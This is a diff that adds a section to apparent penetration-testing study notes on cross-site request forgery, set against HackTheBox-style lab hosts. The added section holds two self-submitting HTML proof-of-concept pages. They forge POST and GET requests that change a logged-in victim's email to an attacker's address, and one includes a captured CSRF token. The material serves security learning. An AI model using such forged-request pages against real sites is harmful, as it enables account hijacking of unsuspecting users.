@@ -136,6 +136,44 @@ To successfully exploit a CSRF vulnerability, we need:
 - To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
 - The victim to be logged into the application at the time when the malicious cross-site request is issued
 
+So we have to create a malicious html file, which makes the appropriate POST request upon visiting it, host it in a webserver and make the victim visit the page while he/she is logged into the specific web application.
+Example of such malicious html file:
+```
+<html>
+  <body>
+    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
+      <input type="hidden" name="email" value="attacker@htb.net" />
+      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
+      <input type="hidden" name="country" value="CSRF_POC" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.getElementById("submitMe").submit()
+    </script>
+  </body>
+</html>
+```
+We can craft the appropriate html file by checking the source of the web app in the browser (view-source:http://webapp.com).
+
+For GET-based CSRF, we try to sniff the cookie and do the same as previously with a similar html file:
+```
+<html>
+  <body>
+    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
+      <input type="hidden" name="email" value="attacker@htb.net" />
+      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
+      <input type="hidden" name="country" value="CSRF_POC" />
+      <input type="hidden" name="action" value="save" />
+      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.getElementById("submitMe").submit()
+    </script>
+  </body>
+</html>
+```
+
 
 
 
